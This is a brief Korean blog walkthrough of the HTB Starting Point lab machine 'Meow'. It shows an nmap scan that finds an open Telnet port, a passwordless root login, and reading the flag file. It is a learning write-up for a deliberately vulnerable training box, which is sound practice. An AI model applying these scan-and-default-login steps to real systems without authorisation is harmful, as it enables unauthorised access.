Overview

Meow는 HTB Starting Point의 첫 번째 머신으로, Telnet 서비스의 잘못된 설정을 이용해 접근하는 매우 간단한 Linux 머신입니다. Github와 HUGO를 최근 알게 되었기에 3-18일 부터 작성 시작하였습니다.

Enumeration

Nmap 포트 스캔

1nmap -sV -sC -oN nmap.txt 10.129.1.17

결과:

PORT   STATE SERVICE VERSION
23/tcp open  telnet  Linux telnetd

Telnet 포트 23번이 열려있는 것을 확인했습니다.

Exploitation

Telnet 접속

1telnet 10.129.1.17

로그인 프롬프트에서 root 로 로그인 시도합니다:

Meow login: root

비밀번호 없이 root 로그인 성공!

플래그 획득

1ls
2cat flag.txt
